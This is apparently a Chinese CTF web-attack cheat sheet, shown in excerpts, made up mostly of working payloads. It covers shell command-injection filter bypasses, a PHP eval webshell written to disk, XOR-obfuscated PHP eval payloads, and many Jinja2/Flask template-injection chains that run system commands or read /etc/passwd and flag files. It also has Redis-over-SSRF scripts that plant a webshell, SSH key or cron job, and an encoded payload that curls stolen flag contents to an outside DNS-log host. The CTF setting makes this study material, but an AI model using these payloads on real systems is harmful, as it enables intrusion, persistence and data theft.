...
```
#常见的绕过符号有：
$IFS$9 、$&#123IFS&#125 、%09(php环境下)、 重定向符<>、<

$IFS在linux下表示分隔符,如果不加&#123&#125则bash会将IFS解释为一个变量名,加一个&#123&#125就固定了变量名,$IFS$9后面之所以加个$是为了起到截断的作用
```
...
# cat flag文件内容：
a=c;b=at;c=f;d=lag;$a$b $&#123c&#125$&#123d&#125

# cat test文件内容
a="ccaatt";b=$&#123a:0:1&#125$&#123a:2:1&#125$&#123a:4:1&#125;$b test
```
...
&#123printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"&#125|\$0 ==>cat /flag
#i也可以通过这种方式写马
#内容为<?php @eval($_POST['c']);?>
$&#123printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125 >> 1.php
```
...
```
[…]表示匹配方括号之中的任意一个字符
&#123…&#125表示匹配大括号里面的所有模式,模式之间使用逗号分隔.
&#123…&#125与[…]有一个重要的区别,当匹配的文件不存在,[…]会失去模式的功能,变成一个单纯的字符串,而&#123…&#125依然可以展开

cat t?st
cat te*
cat t[a-z]st
cat t&#123a,b,c,d,e,f&#125st
```
...
url = "http://192.168.1.100/rce.php?1=&#1230&#125"
print("[+]start attack!!!")
...
$____='';
$___="瞰";$____.=~($___&#123$_&#125);$___="和";$____.=~($___&#123$__&#125);$___="和";$____.=~($___&#123$__&#125);$___="的";$____.=~($___&#123$_&#125);$___="半";$____.=~($___&#123$_&#125);$___="始";$____.=~($___&#123$__&#125);//$____=assert

$_____='_';$___="俯";$_____.=~($___&#123$__&#125);$___="瞰";$_____.=~($___&#123$__&#125);$___="次";$_____.=~($___&#123$_&#125);$___="站";$_____.=~($___&#123$_&#125);//$_____=_POST
...
if(isset($_GET['code']))&#123
   $code=$_GET['code'];
   if(strlen($code)>50)&#123
       die("Too Long.");
   &#125
   if(preg_match("/[A-Za-z0-9_]+/",$code))&#123
       die("Not Allowed.");
   &#125
   @eval($code);
&#125else&#123
...
code=$_="`&#123&#123&#123"^"?<>/";$&#123$_&#125[_]($&#123$_&#125[__]);&_=getFlag

$_="&#123&#123&#123"^"?<>/";=$_="GET";
$&#123$_&#125[_]($&#123$_&#125[__]);=$_GET[_]($_GET[__]);=getFlag($_GET[__])=getFlag(null);
这个 payload 的长度是 37 ,符合题目要求的 小于等于40.另fuzz出了长度为28的payload,如下：

$_="&#123&#123&#123&#123&#123&#123&#123"^"%1c%1e%0f%3d%17%1a%1c";$_();
#getFlag()
```
...
<style>#test&#123x:expression(alert(/XSS/))&#125</style> // IE7以下
```
...
lipsum               flask的一个方法,可以用于得到__builtins__,而且lipsum.__globals__含有os模块：&#123&#123lipsum.__globals__['os'].popen('ls').read()&#125&#125
...
config               当前application的所有配置.此外,也可以这样&#123&#123 config.__class__.__init__.__globals__['os'].popen('ls').read() &#125&#125
g                    &#123&#123g&#125&#125得到<flask.g of 'flask_ssti'>
...
```python
?name=&#123&#123''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()&#125&#125
```
...
```python
&#123&#123().__class__&#125&#125
&#123&#123()["__class__"]&#125&#125
&#123&#123()|attr("__class__")&#125&#125
&#123&#123getattr('',"__class__")&#125&#125
&#123&#123()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125&#125
&#123&#123()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125&#125
```
...
/?exploit=&#123&#123request[request.args.pa]&#125&#125&pa=**class**
```
...
```python
request | attr(request.args.a)等价于request["a"]：?exploit=&#123&#123request|attr(request.args.pa)&#125&#125&pa=**class**
```
...
&#123&#123().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125&#125&arg1=open&arg2=/etc/passwd
&#123&#123().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125&#125
post:arg1=open&arg2=/etc/passwd
&#123&#123().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125&#125
...
&#123&#123()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125&#125
```
...
```python
&#123% for c in [].__class__.__base__.__subclasses__() %&#125&#123% if c.__name__=='catch_warnings' %&#125&#123&#123 c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125&#125&#123% endif %&#125&#123% endfor %&#125
```

###### 用join拼接

```python
&#123&#123()|attr(["_"*2,"cla","ss","_"*2]|join)&#125&#125
```

###### 使用str原生函数替代

```python
&#123&#123().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125&#125
```

###### ascii转换

```python
"&#1230:c&#125".format(97)='a'
"&#1230:c&#125&#1231:c&#125&#1232:c&#125&#1233:c&#125&#1234:c&#125&#1235:c&#125&#1236:c&#125&#1237:c&#125&#1238:c&#125".format(95,95,99,108,97,115,115,95,95)='__class__'
```
...
```python
&#123%print((((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("os"))|attr("\u0070\u006f\u0070\u0065\u006e")("\u0074\u0061\u0063\u0020\u002f\u0066\u002a"))|attr("\u0072\u0065\u0061\u0064")())%&#125
...
&#123% set chr=url_for.__globals__['__builtins__'].chr %&#125
&#123&#123""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125&#125
```

###### 在jinja2可以使用~进行拼接

```python
&#123%set a='__cla' %&#125&#123%set b='ss__'%&#125&#123&#123""[a~b]&#125&#125
1
过滤__init__可以用__enter__或__exit__替代
&#123&#123().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125&#125
&#123&#123().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125&#125
```

###### 过滤config的绕过

```python
&#123&#123self&#125&#125 ⇒ <TemplateReference None>
&#123&#123self.__dict__._TemplateReference__context&#125&#125
```
...
'kawhi'
&#123&#123().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125
 
&#123&#123().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125&#125
```
...
```python
__getattribute__
&#123&#123"".__getattribute__("__cla"+"ss__").__base__&#125&#125
```

配合request

```python
&#123&#123().__getattribute__(request.args.arg1).__base__&#125&#125&arg1=__class__
&#123&#123().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125&#125&arg1=__class__&arg2=whoami
```

##### 过滤了&#123&#123 &#125&#125

```
使用&#123%%&#125,并用print进行标记,得到回显
DNS外带 // TODO
```
...
```python
?name=&#123&#123().__class__.__base__.__subclasses__().pop(185).__init__.__globals__.__builtins__.eval(request.values.arg3).read()&#125&#125&arg3=__import__('os').popen('cat /f*')
```
...
&#123&#123lipsum.__globals__['os'].popen('whoami').read()&#125&#125
&#123&#123lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125&#125
?name=&#123&#123(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125&#125
...
```python
?name=&#123&#123(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()&#125&#125
Cookie: a=__globals__;b=os;c=cat /f*
```

##### 过滤了" ' arg [] _ os &#123&#123 &#125&#125

```python
使用&#123%,因为&#123%%&#125是没有回显的,所以使用print来标记使他有回显

?name=&#123%print((lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read())%&#125
Cookie: a=__globals__;b=os;c=cat /f*
```

##### 过滤了" ' arg [] _ os &#123&#123 &#125&#125 request


###### 拼接字符串

```
&#123% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %&#125
...
```
&#123%set po=dict(po=a,p=a)|join%&#125 #pop
&#123%set xia=(()|select|string|list).pop(24)%&#125 #_
&#123%set ini=(xia,xia,dict(init=a)|join,xia,xia)|join%&#125 #__init__
&#123%set glo=(xia,xia,dict(globals=a)|join,xia,xia)|join%&#125 #__globals__
&#123%set built=(xia,xia,dict(builtins=a)|join,xia,xia)|join%&#125 # __builtins__
&#123%set a=(lipsum|attr(glo)).get(built)%&#125
&#123%set chr=a.chr%&#125 #chr()
&#123%print a.eval(chr(95)~chr(95)~chr(105)~chr(109)~chr(112)~chr(111)~chr(114)~chr(116)~chr(95)~chr(95)~chr(40)~chr(39)~chr(111)~chr(115)~chr(39)~chr(41)~chr(46)~chr(112)~chr(111)~chr(112)~chr(101)~chr(110)~chr(40)~chr(39)~chr(108)~chr(115)~chr(39)~chr(41)).read()%&#125
...
$result='';
for($i=0;$i<strlen($str);$i++)&#123
    $result.='chr('.ord($str[$i]).')~';
&#125
echo substr($result,0,-1);
```

##### 过滤了 " ' arg [] _ os &#123&#123 &#125&#125 数字
...
```
?name=
&#123% set po=dict(po=a,p=a)|join%&#125
&#123% set a=(()|select|string|list)|attr(po)(２４)%&#125
&#123% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125
&#123% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125
&#123% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125
&#123% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125
&#123% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125
&#123% set chr=x.chr%&#125
&#123% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125
&#123%print(x.open(file).read())%&#125
```

##### 过滤了 " ' arg [] _ os &#123&#123 &#125&#125 数字 print
...
def half2full(half):
    ...
    for ch in half:
        ...
        full += ch
    return full
for i in re.findall('\d&#1232,3&#125',str):
...
&#123% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125
&#123% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125
&#123% set chr=x.chr%&#125&#123% set cmd=(chr(９５)~chr(９５)~chr(１０５)~chr(１０９)~chr(１１２)~chr(１１１)~chr(１１４)~chr(１１６)~chr(９５)~chr(９５)~chr(４０)~chr(３９)~chr(１１１)~chr(１１５)~chr(３９)~chr(４１)~chr(４６)~chr(１１２)~chr(１１１)~chr(１１２)~chr(１０１)~chr(１１０)~chr(４０)~chr(３９)~chr(９９)~chr(１１７)~chr(１１４)~chr(１０８)~chr(３２)~chr(１０４)~chr(１１６)~chr(１１６)~chr(１１２)~chr(５８)~chr(４７)~chr(４７)~chr(９６)~chr(９９)~chr(９７)~chr(１１６)~chr(３２)~chr(４７)~chr(１０２)~chr(１０８)~chr(９７)~chr(１０３)~chr(９６)~chr(４６)~chr(１１７)~chr(１０７)~chr(１０５)~chr(５２)~chr(１２１)~chr(５７)~chr(４６)~chr(９９)~chr(１０１)~chr(１２１)~chr(１０１)~chr(４６)~chr(１０５)~chr(１１１)~chr(３９)~chr(４１)
)%&#125&#123%if x.eval(cmd)%&#125aaa&#123%endif%&#125
...
> &#123&#123url_for.\_\_globals\_\_['current_app'].config.FLAG&#125&#125

> &#123&#123get_flashed_messages.\_\_globals\_\_['current_app'].config.FLAG&#125&#125

> &#123&#123request.application.\_\_self\_\_._get_data_for_json.\_\_globals\_\_['json'].JSONEncoder.default.\_\_globals\_\_['current_app'].config['FLAG']&#125&#125

#### 其他

> 过滤了&#123和'字符,&#123可以用︷代替,'可以用＇来代替
...
```python
&#123url_for.__globals__['current_app'].config.FLAG&#125&#125

&#123&#123get_flashed_messages.__globals__['current_app'].config.FLAG&#125&#125

&#123&#123request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125&#125
#利用self姿势
&#123&#123self&#125&#125 ⇒ <TemplateReference None>
&#123&#123self.__dict__._TemplateReference__context.config&#125&#125 ⇒ 同样可以找到config
&#123&#123self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open("/flag").read()&#125&#125
```
...
for i in range(0,300):
    time.sleep(0.06)
    payload = "&#123&#123().__class__.__mro__[-1].__subclasses__()[%s]&#125&#125" % i
...
```xml
&#123"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...
```
...
<?php
highlight_file(__FILE__);
if(!preg_match('/^https/is',$_GET['url']))&#123
die("no hack");
&#125
...
if( $parsed[port] == 80 )&#123  // 这里限制了我们传过去的url只能是80端口的
	readfile($url);
&#125 else &#123
	die('Hacker!');
&#125
...
// O:7:"Welcome":1:&#123s:6:"*url";s:25:"http://127.0.0.1/tool.php";&#125
```
...
<?php
error_reporting(0);
$respect_show_ping = function($params) &#123
   extract($params);
   $ip = isset($ip) ? $ip :'127.0.0.1';
   system('ping -c 1 '.$ip);
&#125;
if ($_SERVER["REMOTE_ADDR"] !== "127.0.0.1")&#123
...
passwd=""
cmd=["flushall",
	 "set 1 &#123&#125".format(shell.replace(" ","$&#123IFS&#125")),
	 "config set dir &#123&#125".format(path),
	 "config set dbfilename &#123&#125".format(filename),
	 "save"
	 ]
if passwd:
	cmd.insert(0,"AUTH &#123&#125".format(passwd))
...
def redis_format(arr):
	...
	for x in redis_arr:
		cmd+=CRLF+"$"+str(len((x.replace("$&#123IFS&#125"," "))))+CRLF+x.replace("$&#123IFS&#125"," ")
	cmd+=CRLF
	return cmd
...
passwd=""
cmd=["flushall",
	 "set 1 &#123&#125".format(ssh_pub.replace(" ","$&#123IFS&#125")),
	 "config set dir &#123&#125".format(path),
	 "config set dbfilename &#123&#125".format(filename),
	 "save"
	 ]
...
passwd=""
cmd=["flushall",
	 "set 1 &#123&#125".format(cron.replace(" ","$&#123IFS&#125")),
	 "config set dir &#123&#125".format(path),
	 "config set dbfilename &#123&#125".format(filename),
	 "save"
	 ]
...
if(preg_match('/[a-z0-9]/is', $_GET['shell']))&#123
...
for char in payload:
    for i in strlist:
        for j in strlist:
            if(i ^ j == ord(char)):
                i = '%&#123:0>2&#125'.format(hex(i)[2:])
                j = '%&#123:0>2&#125'.format(hex(j)[2:])
                print("('&#1230&#125'^'&#1231&#125')".format(i,j),end=".")
                break
            else:
                continue
        break
...
print("('&#123&#125'^'&#123&#125')".format(tmp1,tmp2))
```

网上看到的payload

```php
$&#123%ff%ff%ff%ff^%a0%b8%ba%ab&#125&#123%ff&#125();&%ff=phpinfo

//$&#123_GET&#125&#123%ff&#125();&%ff=phpinfo
```
...
```bash
&#123"killed":false,"code":1,"signal":null,"cmd":"echo | cat /flag > /var/www/web/public/writes/xxx.html"&#125
...
利用通配符： 1; cat$&#123IFS&#125fl* ;1

最简单的：1;cat *;1

1; cat$&#123IFS&#125fla? ;1

1; cat$&#123IFS&#125fla[^1] ;1
...
&#123"username":"admin","password":"123456","__proto__":&#123"isAdmin":true&#125&#125
```
...
> 继续分析代码,因为wtf不是常规的网页文件,故寻找解析wtf文件的代码,找到了include_page函数,能够解析并执行wtf文件,如果还能够上传wtf文件并执行的话,就可以达到控制服务器的目的.继续分析reply函数,这是评论功能的后台代码,这部分也是存在路径穿越的.这行代码把用户名写在了评论文件的内容中：echo "\$&#123username&#125" > "$&#123next_file&#125";如果用户名是一段可执行代码,而且写入的文件是wtf格式的,那么这个文件就能够执行我们想要的代码.上传的文件末尾需要添加%09字符,这是水平制表符,必须添加,不然后台会把我们的后门当做目录去解析.

> 分别注册\$&#123find,/,-iname,get_flag2&#125与$/usr/bin/get_flag2用户名,然后去评论文章,抓包,url修改为/reply.wtf?post=../users_lookup/shell.wtf%09,访问/users_lookup/shell.wtf得到了另一部分flag.
...
```
POST /cgi-bin/file.pl?/bin/bash%20-c%20ls$&#123IFS&#125/| HTTP/1.1
